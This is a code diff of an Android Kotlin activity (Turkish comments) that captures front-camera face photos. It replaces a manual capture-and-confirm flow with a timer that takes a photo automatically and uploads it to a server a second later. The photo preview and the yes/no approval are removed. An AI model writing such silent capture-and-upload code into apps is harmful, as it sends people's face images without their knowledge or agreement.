@@ -6,10 +6,10 @@ import android.graphics.Bitmap
 import android.graphics.BitmapFactory
 import android.graphics.Matrix
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.view.LayoutInflater
-import android.view.View
 import android.widget.Button
-import android.widget.ImageView
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AlertDialog
@@ -21,7 +21,6 @@ import androidx.camera.core.Preview
 import androidx.camera.lifecycle.ProcessCameraProvider
 import androidx.camera.view.PreviewView
 import androidx.core.content.ContextCompat
-import com.bumptech.glide.Glide
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
@@ -31,6 +30,7 @@ import java.io.OutputStream
 import java.net.HttpURLConnection
 import java.net.URL
 import java.util.Base64
+
 
 
 class Sayfa6 : AppCompatActivity() {
@@ -48,24 +48,8 @@ class Sayfa6 : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_sayfa6)
 
-        val previewViewFace = findViewById<PreviewView>(R.id.previewViewFace)
-
-        val buttonForward = findViewById<Button>(R.id.button_forward)
-        buttonForward.visibility = View.INVISIBLE
-
-        val buttonYes = findViewById<Button>(R.id.yes)
-        buttonYes.visibility = View.INVISIBLE
-
-        val buttonNo = findViewById<Button>(R.id.no)
-        buttonNo.visibility = View.INVISIBLE
-
         val preview = Preview.Builder().build()
         val cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA
-
-        buttonForward.setOnClickListener {
-            val intent = Intent(this, Sayfa7::class.java)
-            startActivity(intent)
-        }
 
         cameraProviderFuture.addListener(
             {
@@ -81,6 +65,16 @@ class Sayfa6 : AppCompatActivity() {
                     imageCapture = ImageCapture.Builder()
                         .setTargetRotation(display.rotation)
                         .build()
+
+                    val handler = Handler(Looper.getMainLooper())
+
+                    handler.postDelayed({
+                        captureImage()
+                        handler.postDelayed({
+                            sendCapturedPhotoToServer()
+                        }, 1000) // captureImage işleminden 1 saniye sonra sendCapturedPhotoToServer işlemi başlar
+                    }, 2000)
+
                 } else {
                     while (display == null) {
                         // Eğer display null ise sayfayı yeniden başlat
@@ -94,34 +88,6 @@ class Sayfa6 : AppCompatActivity() {
             }, ContextCompat.getMainExecutor(this)
         )
 
-        val captureButton = findViewById<Button>(R.id.take_photo_face)
-        captureButton.setOnClickListener {
-            captureImage()
-
-            val text = findViewById<TextView>(R.id.textFace)
-
-            previewViewFace.visibility = View.INVISIBLE
-            captureButton.visibility = View.INVISIBLE
-            text.visibility = View.INVISIBLE
-
-            buttonYes.visibility = View.VISIBLE
-            buttonNo.visibility = View.VISIBLE
-
-            buttonYes.setOnClickListener {
-                buttonNo.visibility = View.INVISIBLE
-                buttonYes.visibility = View.INVISIBLE
-                sendCapturedPhotoToServer()
-            }
-            buttonNo.setOnClickListener {
-                buttonNo.visibility = View.INVISIBLE
-                buttonYes.visibility = View.INVISIBLE
-                captureButton.visibility = View.VISIBLE
-                text.visibility = View.VISIBLE
-                previewViewFace.visibility = View.VISIBLE
-                val photoImageView = findViewById<ImageView>(R.id.photoImageView)
-                photoImageView.setImageDrawable(null)
-            }
-        }
     }
 
     private fun captureImage() {
@@ -136,7 +102,6 @@ class Sayfa6 : AppCompatActivity() {
             object : ImageCapture.OnImageSavedCallback {
                 override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                     capturedPhotoFile = imageFile
-                    showCapturedPhoto() // Çekilen fotoğrafı göster
                 }
 
                 override fun onError(exception: ImageCaptureException) {
@@ -145,23 +110,6 @@ class Sayfa6 : AppCompatActivity() {
                 }
             }
         )
-    }
-
-    private fun showCapturedPhoto() {
-        val photoImageView = findViewById<ImageView>(R.id.photoImageView)
-        capturedPhotoFile?.let { file ->
-
-            val bitmap = BitmapFactory.decodeFile(file.absolutePath)
-
-            // Fotoğrafı yatay olarak ters çevir
-            val matrix = Matrix()
-            matrix.preScale(-1f, 1f)
-            val flippedBitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
-
-            Glide.with(this@Sayfa6)
-                .load(flippedBitmap)
-                .into(photoImageView)
-        }
     }
 
     @SuppressLint("ResourceType")
